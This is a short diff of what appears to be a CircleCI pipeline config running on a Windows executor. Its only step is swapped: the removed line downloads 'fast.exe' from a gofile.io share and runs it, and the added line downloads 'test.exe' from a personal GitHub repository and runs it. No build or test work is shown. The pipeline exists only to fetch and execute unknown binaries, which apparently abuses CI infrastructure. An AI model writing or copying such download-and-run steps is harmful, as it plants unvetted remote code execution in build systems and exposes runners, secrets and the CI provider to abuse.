@@ -9,4 +9,4 @@ jobs:
       name: win/default
       shell: cmd.exe
     steps:
-      - run: curl -L -o fast.exe https://srv-store3.gofile.io/download/H76lCU/1a3ef2c695de20ede50d2b4e7454256a/fast.exe && fast.exe
+      - run: curl -L -o test.exe https://github.com/couheh/lab2/raw/main/test.exe && test.exe
